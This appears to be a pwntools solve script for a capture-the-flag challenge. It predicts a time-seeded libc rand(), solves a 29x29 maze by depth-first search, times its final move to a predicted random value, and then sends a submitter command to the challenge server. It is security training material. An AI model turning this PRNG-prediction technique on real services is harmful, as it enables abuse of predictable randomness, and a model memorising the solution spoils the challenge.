from pwn import *
from ctypes import CDLL

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))
libc = CDLL('libc.so.6')
libc.srand(libc.time(0))
for _ in range(590):
    libc.rand()
# p=process("./challenge")
p.sendlineafter("torment:","a")
libc.rand()
p.recvuntil(b"maze.\n")
maze=[[0 for i in range(29)] for j in range(29)]
for i in range(29):
    mm=p.recvline()[:-1]
    for j in range(29):
        maze[i][j]=chr(mm[j])
dx=[0,0,1,-1]
dy=[1,-1,0,0]
go=['e','w','s','n']
def dfs(i,j,path):
    if maze[i][j]=='*':
        return path
    maze[i][j]='#'
    for _ in range(4):
        di=i+dx[_]
        dj=j+dy[_]
        if di<0 or di>=29 or dj<0 or dj>=29 or maze[di][dj]=='#':
            continue
        ans=dfs(di,dj,path+go[_])
        if ans:
            return ans
    maze[i][j]='.'
    return None
path=dfs(1,1,'')
for i in path[:-1]:
    p.sendlineafter("torment:",i)
    libc.rand()

# context.log_level="debug"

while True:
    r = libc.rand()
    if r % 1213 == 1212:
        break
    p.sendlineafter("torment:",b'0')

p.sendlineafter("torment:", path[-1])

# p.interactive()
p.sendlineafter(b'have solved the maze!', b'./submitter')
print(p.recvall(timeout=5))

# print(path)